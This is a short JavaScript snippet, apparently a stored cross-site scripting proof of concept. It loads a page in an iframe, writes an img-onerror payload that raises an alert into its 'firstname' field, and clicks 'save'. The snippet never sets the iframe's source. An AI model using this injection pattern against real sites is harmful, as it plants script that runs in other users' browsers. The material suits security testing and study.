var frame = document.createElement("iframe");
frame.addEventListener("load", function() {
  setTimeout(function() {
    frame.contentDocument.getElementById("firstname").value = '&lt;img src="q" onerror="alert(5555)"&gt;';
    frame.contentDocument.getElementsByClassName("save")[0].click();
    setTimeout(function() {
      console.log("CHANGED!");
    }, 2000);
  }, 1000);
});
